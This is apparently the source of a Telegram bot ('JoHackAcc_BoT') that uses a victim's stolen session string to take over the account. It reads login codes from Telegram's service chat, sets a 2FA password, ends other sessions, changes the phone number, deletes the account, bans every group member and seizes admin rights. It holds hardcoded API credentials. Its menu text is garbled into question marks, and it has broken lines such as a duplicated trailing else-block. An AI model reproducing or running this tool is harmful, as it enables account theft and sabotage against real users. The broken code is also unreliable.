from telethon.tl.functions.channels import CreateChannelRequest as ccr
import os
from telethon import TelegramClient, events, functions, types
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from flask import Flask, request
from config import *
global bot
global TOKEN
client = TelegramClient('session', api_id, api_hash).start(bot_token=bot_token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "JoHackAcc_BoT"
bot = borg = client

legendx = 5539142769

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    try:
      await X.edit_2fa('LEGENDXISBEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 1263966, "6ae148a39b2074da28fa7e98c7f7e094") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "VZX_TEAM"
cmds = '''

1: ???????????? ???? ?????????? ?????????????? ????????????

2: ?????????? ?????????????? ???????????????? ?????? ?????????? ???????????? ?????????????? ???????????????? ????????

3: ???????? ???????? ?????????? ???????? ????????

4: ???????????? ???????????? ?????? ???????? ????????????

5: ???????????? ?????????? ???????????? ?????? ???????????? 

6: ???????????? ???? ???????? ???????????? ?????? ????????????

7: ?????? ???????? ???? ????????

8: ???????????? ?????? ?????? ???????????? ?????????????? ???????? ???? ????

9: ?????????? ???????????? ???? ???????? ?????????????? ???? ?????? ?????????? ??????

10: ?????? ???????? ????????????

11: ?????????? ???????? ?????? ???????????? ???? ???????? ???? ????????

12: ?????????? ?????? ???? ???????? ???? ????????

13: ?????????? ?????? ???????????? ???????????????? ?????? ????????????

**???????? ?????????? ???????????? ???????? ?????????? **
'''
start_message = '''
???????? ????
?????????? ???????????? ???? ???????? ???? ???????? ?????? ???????????? ?????? 
?????????????? ???????? /co 
?????????????? ???? ???????????? ???????? /de
Prograstart_messageer : @C0_28|@TTRAKOSZ\nChannel : @VZX_TEAM|@trprogram
'''

de_m = '''
Programmer : @C0_28|@TTRAKOSZ 
Channel : @VZX_TEAM|@trprogram 	
'''

@client.on(events.NewMessage(pattern="/de"))
async def de(event):
  global de_m
  if not event.is_private:
    await event.reply("**???????????? ???????????????? ???? ?????????? **")
  else:
    await event.reply(de_m)
    
@client.on(events.NewMessage(pattern="/start"))
async def co(event):
  global start_message
  if not event.is_private:
    await event.reply("**???????????? ???????????????? ???? ?????????? **")
  else:
    await event.reply(start_message)

@client.on(events.NewMessage(pattern="/co", func=lambda x: x.is_group))
async def co(event):
  await event.reply("please use me in Group")
@client.on(events.NewMessage(pattern="/co", func = lambda x: x.is_private))
async def start(event):
  global cmds
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"?????????? ???????? ???????? ???? ???????? ???????????? ?????? ???????????? \n\n{cmds}")
    res = await x.get_response()
    r = res.text
    if res.text == "1":
      await x.send_message("** ???????? ??????  ???????????? ???????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("?????? ???????????? ?????? ???? ?????????? ????????????")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("?????? ???????????? ?????? ???? ?????????? ????????????")
      if len(i) > 3855:
        file = coen("session.txt", "w")
        file.write(i + "\n\nDETAILS BY The Jordan Ghost ")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n ???????? ?????????????????? ?????????????? ?????????? ??????")
    elif res.text == "2":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("?????? ???????????? ?????? ???? ?????????? ????????????")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\n???????? ?????????????????? ?????????????? ?????????? ??????")
    elif r == "3":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("?????? ???????????? ?????? ???? ?????????? ????????????")
      await x.send_message("**???????? ???????? ???????? ????????/???????????? **")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("** ???? ?????? ???????? ?????????????? **")
    elif r == "4":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\n???????? ?????????????????? ?????????????? ?????????? ?????? ")
    elif r == "5":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      await x.send_message("** ???????? ???????? ????????????/???????????? **")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("**???? ???????? ????????????/???????????? ?????????? **")
    elif r == "6":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      await x.send_message("** ???????????? ???????? ????????????/???????????? **")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("**?????? ???????????????? ??????????**")
    elif r == "7":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      await x.send_message("** ???????? ???????? ????????????/???????????? **")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("** ?????? ?????????? ?????????? ?????????? **")
    elif r == "8":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      i = await user2fa(strses.text)
      if i:
        await event.reply("** ???????????????? ???????????? ???????? ??????????????! ?????????? ???????? ?????????? ???????????? **")
      else:
        await event.reply("** ?????????? ???????????????? ?????????? ???????? ?????????????? **")
    elif r == "9":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      i = await terminate(strses.text)
      await event.reply("** ???? ?????????? ???????????? ???? ???????? ?????????????? ?????????? **")
    elif res.text == "10":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      i = await delacc(strses.text)
      await event.reply("**???? ?????? ???????????? ?????????? **")
    elif res.text == "11":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      await x.send_message("** ???????? ???? ???????????? ?????? ???????????????? ?????????? ??????????????/???????????? **")
      grp = await x.get_response()
      await x.send_message("** ???????? ???????? ?????????? **")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("** ?????? ?????? ?????????????? ????????! **")
    elif res.text == "12":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      await x.send_message("** ???????? ???? ???????????? ???????? ????????????/???????????? **")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("** ?????? ?????? ???????????? ???????? ?????????????? ?????????? **")
    elif res.text == "13":
      await x.send_message("** ???????? ?????? ???????????? **")
      strses = await x.get_response()
      co = await cu(strses.text)
      if co:
        pass
      else:
        return await event.respond("** ?????? ???????????? ???? ???????????? **")
      await x.send_message("** ???????? ???? ???????????? ?????????? ???????? ???????? ???????? ???? ???????????? **\n???????????????? ?????????? ?????????? ??????????????")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n **ccoy the phone code hash and check your number you got otp\ni stco for 20 sec ccoy phone code hash and otp**")
        await asyncio.sleep(20)
        await x.send_message("NOW GIVE PHONE CODE HASH")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("NOW GIVE THE OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("**?????????????? ???? ?????????? ?????? ???????????? **")
        else:
          await event.respond("?????? ?????? ")
      except Exception as e:
        await event.respond("**?????? ???????????? ???? ?????????? ???????????? ?????? : @C0_28**" + str(e))

    else:
      await event.respond("**???? ?????? ???????????? ?????? ??????????! ???????????? ?????????? : /co ?????????????????? ???????? ??????**")

client.run_until_disconnected()

    else:
      await event.respond("**???? ?????? ???????????? ?????? ??????????! ???????????? ?????????? : /co ?????????????????? ???????? ??????**")

client.run()